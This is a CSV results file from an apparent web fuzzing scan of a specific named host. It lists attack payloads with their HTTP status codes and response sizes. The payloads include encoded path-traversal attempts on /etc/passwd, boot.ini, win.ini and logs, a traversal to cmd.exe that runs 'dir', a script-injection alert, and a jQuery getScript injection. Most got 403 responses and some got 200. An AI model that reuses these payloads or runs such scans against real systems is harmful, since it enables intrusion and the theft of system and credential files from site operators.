FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://msoid.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,11.545659ms,
../config.js,https://msoid.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,12.883189ms,
..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development,https://msoid.officevibe.com/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development,,5888,403,312,17,7,text/html; charset=us-ascii,32.481105ms,
../../../etc/passwd,https://msoid.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,11.353459ms,
_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,9417,403,312,17,7,text/html; charset=us-ascii,80.562332ms,
*.php</pre></body></html>,https://msoid.officevibe.com/*.php</pre></body></html>,,12724,200,154968,2967,161,text/html; charset=utf-8,94.509604ms,
./../../../../../../../../../etc/passw*,https://msoid.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,11.251263ms,
../../boot.ini,https://msoid.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,11.136388ms,
../../../logs/error.log,https://msoid.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,11.140528ms,
..///etc/passwd,https://msoid.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,11.175604ms,
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://msoid.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,,20499,200,188787,4938,168,text/html; charset=utf-8,74.442214ms,
15.6000.10.01/Login,https://msoid.officevibe.com/15.6000.10.01/Login,,20856,200,155240,2980,165,text/html; charset=utf-8,47.546959ms,
monstra/blog/<page_name>.php,https://msoid.officevibe.com/monstra/blog/<page_name>.php,,20877,200,154968,2967,161,text/html; charset=utf-8,191.374622ms,
modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>,,21251,200,154968,2967,161,text/html; charset=utf-8,54.559647ms,
index.php/login,https://msoid.officevibe.com/index.php/login,,23785,200,155239,2980,165,text/html; charset=utf-8,27.900024ms,
file/../../../../../../../../etc,https://msoid.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,10.902351ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://msoid.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,11.51949ms,
./../../../../../../../../../etc/*,https://msoid.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,11.165597ms,
